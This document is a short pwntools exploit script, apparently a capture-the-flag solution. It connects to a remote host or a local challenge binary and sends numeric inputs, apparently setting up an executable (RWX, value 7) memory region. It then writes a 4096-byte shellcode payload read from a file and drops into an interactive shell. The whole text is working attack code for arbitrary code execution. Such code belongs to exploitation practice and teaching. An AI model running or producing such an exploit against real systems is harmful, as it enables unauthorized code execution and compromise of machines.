from pwn import *
from subprocess import run

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    run("make", check=True)
    p = process("../chal/chal", cwd="../chal")

for n in [
    0,
    0x1000,
    0,
    0,
    0,
    7,
]:
    p.sendlineafter(b"> ", str(n).encode())

p.send(open("shellcode", "rb").read().ljust(4096, b"\x00"))
p.sendlineafter(b"> ", b"0")

p.interactive()